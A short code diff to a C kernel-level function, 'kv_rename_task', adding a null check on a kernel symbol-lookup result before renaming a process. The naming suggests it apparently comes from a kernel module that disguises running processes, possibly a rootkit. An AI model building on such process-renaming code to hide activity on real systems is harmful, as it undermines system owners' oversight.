@@ -423,7 +423,7 @@ void kv_rename_task(pid_t pid, const char *newname) {
     char buf[TASK_COMM_LEN] = {0};
 
     struct kernel_syscalls *ks = kv_kall_load_addr();
-    if (!newname || pid <= 1)
+    if (!ks || !newname || pid <= 1)
         return;
 
     list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
